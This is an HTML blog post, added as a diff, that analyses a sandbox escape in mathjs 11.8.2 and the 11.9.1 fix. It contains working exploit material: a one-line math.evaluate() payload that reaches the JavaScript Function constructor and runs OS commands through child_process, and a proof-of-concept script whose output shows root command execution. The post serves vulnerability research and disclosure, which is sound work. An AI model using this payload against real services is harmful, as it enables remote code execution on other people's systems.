@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/posts/mathjs-sandbox-escape-rce.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Escaping the mathjs Sandbox: math.evaluate() to Remote Code Execution - ribeir.in</title>
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../"></div>
+
+        <main>
+            <article class="content">
+                <h1>Escaping the mathjs Sandbox: From math.evaluate() to Remote Code Execution</h1>
+
+                <div class="post-meta" style="margin-bottom: 30px;">
+                    [2026-06-01] | Author: ribeirin | Reading time: 12 min
+                </div>
+
+                <div class="tags" style="margin-bottom: 30px;">
+                    <span class="tag">rce</span>
+                    <span class="tag">mathjs</span>
+                    <span class="tag">sandbox escape</span>
+                    <span class="tag">code injection</span>
+                    <span class="tag">nodejs</span>
+                </div>
+
+                <h2>## Abstract</h2>
+
+                <p>
+                    While hunting on a bug bounty program I ran into a service that evaluated untrusted input with
+                    <a href="https://mathjs.org/" target="_blank">mathjs</a>, the popular JavaScript math library. The build
+                    in use was <code>mathjs 11.8.2</code>, which sits just before a security fix that shipped quietly in
+                    <code>11.9.1</code>. What follows is the part that actually interested me as research: the mathjs
+                    internals that let an evaluated expression climb out of the library's own safety allow-list, reach the
+                    JavaScript <code>Function</code> constructor, and turn <code>math.evaluate()</code> into arbitrary code
+                    execution (and from there, OS command execution).
+                </p>
+
+                <p>
+                    This post covers the root cause inside the <code>FunctionNode</code> and <code>SymbolNode</code>
+                    compilers, how to build the escape primitive, and a reproducible local proof of concept against
+                    <code>mathjs 11.8.2</code>. It is presented anonymized: no target details, just the library research,
+                    which concerns public open-source code that was patched back in 2023.
+                </p>
+
+                <h2>## How I Ended Up Reading mathjs</h2>
+
+                <p>
+                    The trail started with one observation during recon: an input whose value came back <em>evaluated</em>,
+                    not echoed. Sending <code>7*7</code> returned <code>49</code>. mathjs exposes its own version through the
+                    <code>version</code> symbol, and that returned <code>11.8.2</code>. I recognized the number as
+                    pre-<code>11.9.1</code>, the release that silently fixed a <code>FunctionNode</code> / <code>SymbolNode</code>
+                    code-execution bug, and the rest of the work was confirming and weaponizing it. From here on the focus is
+                    the library, not the host.
+                </p>
+
+                <h2>## mathjs Is Not a Sandbox (But It Tries)</h2>
+
+                <p>
+                    The maintainers state plainly that
+                    <a href="https://mathjs.org/docs/expressions/security.html" target="_blank">evaluating untrusted
+                    expressions is unsafe by design</a>. Even so, mathjs ships an internal model meant to stop the obvious
+                    escapes: reaching <code>constructor</code>, <code>__proto__</code>, or prototype methods from inside an
+                    evaluated expression. It lives in <code>src/utils/customs.js</code> as an allow-list:
+                </p>
+
+                <pre><code>// src/utils/customs.js (v11.8.2)
+
+function getSafeProperty (object, prop) {
+  if (isPlainObject(object) &amp;&amp; isSafeProperty(object, prop)) {
+    return object[prop]
+  }
+  if (typeof object[prop] === 'function' &amp;&amp; isSafeMethod(object, prop)) {
+    throw new Error('Cannot access method "' + prop + '" as a property')
+  }
+  throw new Error('No access to property "' + prop + '"')
+}
+
+function isSafeProperty (object, prop) {
+  if (!object || typeof object !== 'object') {
+    return false
+  }
+  // safe: whitelisted, e.g. length
+  if (hasOwnProperty(safeNativeProperties, prop)) {
+    return true
+  }
+  // unsafe: inherited from Object.prototype, e.g. constructor
+  if (prop in Object.prototype) {
+    return false
+  }
+  // unsafe: inherited from Function.prototype, e.g. call, apply
+  if (prop in Function.prototype) {
+    return false
+  }
+  return true
+}</code></pre>
+
+                <p>
+                    The line that matters is <code>if (prop in Object.prototype) return false</code>. Because
+                    <code>constructor</code> is inherited from <code>Object.prototype</code>,
+                    <code>getSafeProperty(obj, "constructor")</code> always throws
+                    <code>No access to property "constructor"</code>. So long as every property read during evaluation goes
+                    through <code>getSafeProperty</code>, the classic <code>"".constructor.constructor("...")()</code> trick
+                    is dead. The bug is that <code>11.8.2</code> has two reads that never call it.
+                </p>
+
+                <h2>## How mathjs Evaluates an Expression</h2>
+
+                <p>
+                    <code>math.evaluate(str)</code> runs in three stages. <code>parse(str)</code> builds an Abstract Syntax
+                    Tree of typed nodes (<code>FunctionNode</code>, <code>SymbolNode</code>, <code>ConstantNode</code>,
+                    <code>ArrayNode</code>, and so on). Each node implements <code>_compile(math, argNames)</code>, which
+                    returns a plain JavaScript closure shaped like <code>function (scope, args, context)</code>. That closure
+                    is then run to produce the value.
+                </p>
+
+                <p>
+                    Two parameters carry the whole story. <code>math</code> is the namespace of built-in functions and
+                    constants. <code>argNames</code> is an object whose keys are the names bound as <em>function-assignment
+                    arguments</em>, the <code>x</code> in a definition like <code>f(x) = x^2</code>. At runtime the closure
+                    receives <code>args</code>, the object that actually holds the values for those bound names. That
+                    <code>args</code> object is where the hole is.
+                </p>
+
+                <h2>## Root Cause: Two Unguarded Property Reads</h2>
+
+                <h3>### Hole #1, FunctionNode._compile</h3>
+
+                <p>
+                    When the thing being called is a bare symbol (e.g. <code>foo(...)</code>),
+                    <code>FunctionNode._compile</code> branches on whether that symbol is a known argument name. If it is
+                    <strong>not</strong> an argument name, mathjs resolves it safely, through <code>scope</code> or through
+                    <code>getSafeProperty(math, name)</code>. If it <strong>is</strong> treated as an argument name, it takes
+                    the other branch:
+                </p>
+
+                <pre><code>// src/expression/node/FunctionNode.js (v11.8.2)
+
+_compile (math, argNames) {
+  const evalArgs = this.args.map((arg) => arg._compile(math, argNames))
+
+  if (isSymbolNode(this.fn)) {
+    const name = this.fn.name
+    if (!argNames[name]) {
+      /* safe path: resolves name via scope.get(name) or getSafeProperty(math, name) */
+    } else { // attacker forces this branch
+      const rawArgs = this.args
+      return function evalFunctionNode (scope, args, context) {
+        const fn = args[name]                       // [1] raw read, no getSafeProperty()
+        if (typeof fn !== 'function') {
+          throw new TypeError(
+            `Argument '${name}' was not a function; received: ${strin(fn)}`
+          )
+        }
+        if (fn.rawArgs) {
+          return fn(rawArgs, math, createSubScope(scope, args), scope)
+        } else {
+          const values = evalArgs.map((evalArg) => evalArg(scope, args, context))
+          return fn.apply(fn, values)               // [2] Function.apply(Function, ['&lt;body&gt;'])
+        }
+      }
+    }
+  }
+  /* ... AccessorNode branches ... */
+}</code></pre>
+
+                <p>
+                    At <code>[1]</code> the function value is read with a <strong>raw</strong> property access,
+                    <code>args[name]</code>, no <code>getSafeProperty</code> wrapper. The only guard is a
+                    <code>typeof fn !== 'function'</code> check, which is trivial to satisfy. At <code>[2]</code>, if
+                    <code>fn</code> happens to be the JavaScript <code>Function</code> constructor and <code>values</code> is
+                    <code>['&lt;body&gt;']</code>, then <code>fn.apply(fn, values)</code> is exactly
+                    <code>Function('&lt;body&gt;')</code>, a brand-new JS function built from an attacker string.
+                </p>
+
+                <h3>### Hole #2, SymbolNode._compile</h3>
+
+                <p>The sibling node has the same class of bug for bare symbol reads:</p>
+
+                <pre><code>// src/expression/node/SymbolNode.js (v11.8.2)
+
+_compile (math, argNames) {
+  const name = this.name
+
+  if (argNames[name] === true) {
+    // function-assignment argument: the x in f(x) = ...
+    return function (scope, args, context) {
+      return args[name]                 // raw read, no getSafeProperty()
+    }
+  } else if (name in math) {
+    return function (scope, args, context) {
+      return scope.has(name) ? scope.get(name) : getSafeProperty(math, name)
+    }
+  } else {
+    /* ... unit / undefined symbol ... */
+  }
+}</code></pre>
+
+                <p>
+                    Notice the asymmetry: the <code>name in math</code> branch is careful to call
+                    <code>getSafeProperty(math, name)</code>, but the argument-name branch reaches straight into
+                    <code>args[name]</code>. Both nodes trusted the <code>args</code> object as if its keys could only ever be
+                    the safe identifiers from the expression. But every JavaScript object carries <code>constructor</code> on
+                    its prototype chain.
+                </p>
+
+                <h3>### Why "constructor" slips through</h3>
+
+                <p>The branch that reaches the raw read is gated on the argument-name lookup:</p>
+
+                <ul>
+                    <li><code>FunctionNode</code>: the raw branch is the <code>else</code> of <code>if (!argNames[name])</code>, so it is taken whenever <code>argNames[name]</code> is <em>truthy</em>.</li>
+                    <li><code>SymbolNode</code>: gated on <code>argNames[name] === true</code>.</li>
+                </ul>
+
+                <p>
+                    Here is the trick. <code>argNames</code> is just a JavaScript object, and a property read like
+                    <code>argNames["constructor"]</code> is <strong>truthy</strong> via the prototype chain. It resolves to a
+                    constructor function, never <code>undefined</code>. So for <code>name = "constructor"</code> the
+                    <code>FunctionNode</code> guard <code>!argNames[name]</code> is <code>false</code>, and execution falls
+                    into the raw branch. mathjs now believes <code>constructor</code> is a locally bound argument and reads it
+                    straight off <code>args</code>. If we also control what <code>args</code> <em>is</em> at call time, then
+                    <code>args["constructor"]</code> is whatever constructor we choose, including <code>Function</code>.
+                </p>
+
+                <h2>## The 11.9.1 Fix</h2>
+
+                <p>
+                    The patch (commit <code>6dcbc6b</code>) is tiny: it wraps both raw reads in <code>getSafeProperty</code>,
+                    so the lookup now goes through the same allow-list as every other property access:
+                </p>
+
+                <pre><code>// FunctionNode.js
+-          const fn = args[name]
++          const fn = getSafeProperty(args, name)
+
+// SymbolNode.js
+-          return args[name]
++          return getSafeProperty(args, name)</code></pre>
+
+                <p>
+                    After the fix, evaluating a <code>constructor(...)</code> expression routes through
+                    <code>getSafeProperty(args, "constructor")</code>, which hits <code>prop in Object.prototype</code> and
+                    throws <code>No access to property "constructor"</code>. The two raw <code>args[name]</code> reads were the
+                    whole hole, and <code>11.8.2</code> predates the patch, so the hole is open.
+                </p>
+
+                <h2>## Building the Escape Primitive</h2>
+
+                <p>
+                    Putting the two holes together gives a clean primitive. Parsing
+                    <code>constructor('&lt;JS source&gt;')</code> builds a <code>FunctionNode</code> whose function symbol is
+                    named <code>constructor</code> and whose single argument is a <code>ConstantNode</code> holding our JS
+                    source string. Walking the AST through compilation and invocation:
+                </p>
+
+                <pre><code>parse("constructor('return process.version')")
+    -> FunctionNode( fn   = SymbolNode("constructor"),
+                     args = [ ConstantNode("return process.version") ] )
+
+._compile(1, 1)                       // any truthy math/argNames
+    -> argNames["constructor"] is truthy, so the raw branch is taken
+    -> returns the closure evalFunctionNode(scope, args, context)
+
+closure(0, Math.cos)                  // scope unused, args = a js function
+    -> fn     = args["constructor"]   // = the Function constructor
+    -> values = ["return process.version"]
+    -> Function.apply(Function, values) === Function("return process.version")
+    -> a freshly built js function
+
+f()                                   // runs the body in the node.js process
+    -> "v18.20.8"</code></pre>
+
+                <p>
+                    The key move is passing a real JavaScript function as the runtime <code>args</code> object. The
+                    constructor of any function is <code>Function</code>, and <code>Function("...")</code> is JavaScript's
+                    string-to-code gateway. Inside that built function we have the full Node.js global scope, so
+                    <code>global.process.mainModule.require('child_process').execSync('...')</code> is one step from OS command
+                    execution.
+                </p>
+
+                <p>
+                    Two small details make the primitive survive a real <code>math.evaluate()</code> call rather than only the
+                    internal API. First, <code>_compile(1, 1)</code> uses plain truthy scalars instead of object literals,
+                    which some configurations disable; the <code>constructor</code> argument is a <code>ConstantNode</code> that
+                    ignores <code>math</code> and <code>argNames</code> anyway. Second, packing the steps into a mathjs array
+                    indexed at the end, <code>[a, b, c][3]</code>, runs all three sub-expressions in a shared scope and returns
+                    the third as a single scalar string (mathjs indexing is 1-based). The result is a one-line expression:
+                </p>
+
+                <pre><code>[c=parse("constructor('return global.process.mainModule.require(`child_process`).execSync(`id`).toString()')")._compile(1,1),f=c(0,cos),f()][3]</code></pre>
+
+                <h2>## Proof of Concept</h2>
+
+                <p>
+                    The whole thing reproduces offline against a stock <code>mathjs 11.8.2</code> install, no target involved:
+                </p>
+
+                <pre><code>npm init -y
+npm i mathjs@11.8.2</code></pre>
+
+                <pre><code>// poc.js
+const math = require('mathjs')
+console.log('mathjs version:', math.version)
+
+// 1) the escape primitive, via the internal _compile path
+const node = math.parse("constructor('return process.version')")
+const built = node._compile(1, 1)(0, Math.cos)   // pass a js function so args['constructor'] is Function
+console.log('JS exec   ->', built())
+
+// 2) os command execution
+const src = "constructor('return global.process.mainModule.require(`child_process`).execSync(`id`).toString()')"
+console.log('OS exec   ->', math.parse(src)._compile(1, 1)(0, Math.cos)().trim())
+
+// 3) same one-liner an app would feed to math.evaluate() on untrusted input
+const payload = "[c=parse(\"constructor('return process.version')\")._compile(1,1),f=c(0,cos),f()][3]"
+console.log('evaluate  ->', math.evaluate(payload))</code></pre>
+
+                <pre><code>$ node poc.js
+mathjs version: 11.8.2
+JS exec   -> v18.20.8
+OS exec   -> uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),...
+evaluate  -> v18.20.8</code></pre>
+
+                <p>
+                    Three things are proven in one run: arbitrary JavaScript executes (it reads the host Node.js version),
+                    arbitrary OS commands execute (it runs <code>id</code>), and the exact same escape works through the
+                    public <code>math.evaluate()</code> API on a plain expression string. The <code>id</code> output reflects
+                    whatever user the Node.js process runs as; in the deployment where I found this, that was <code>root</code>.
+                    Swapping <code>id</code> for <code>uname -a</code>, <code>hostname</code>, or any command works the same way.
+                </p>
+
+                <h2>## References</h2>
+
+                <ul>
+                    <li><a href="https://mathjs.org/docs/expressions/security.html" target="_blank">mathjs - Expression evaluation security</a></li>
+                    <li><a href="https://github.com/josdejong/mathjs/commit/6dcbc6b7933bd076b18f3eed0393895ca62d4f51" target="_blank">mathjs 11.9.1 fix commit (FunctionNode / SymbolNode / customs)</a></li>
+                    <li><a href="https://github.com/josdejong/mathjs/blob/v11.8.2/src/expression/node/FunctionNode.js" target="_blank">FunctionNode.js @ v11.8.2 (vulnerable)</a></li>
+                    <li><a href="https://github.com/josdejong/mathjs/blob/v11.8.2/src/utils/customs.js" target="_blank">customs.js @ v11.8.2 (getSafeProperty / isSafeProperty)</a></li>
+                    <li><a href="https://github.com/josdejong/mathjs/blob/develop/HISTORY.md" target="_blank">mathjs HISTORY / changelog (11.9.1)</a></li>
+                </ul>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">mathjs 11.8.2 // Sandbox Escape to RCE</div>
+                    <div class="eof-author">ribeirin</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
+                <a href="../posts.html">&lt;&lt; Back to Posts</a>
+            </div>
+        </main>
+
+        <div data-component="footer" data-base-path="../"></div>
+    </div>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
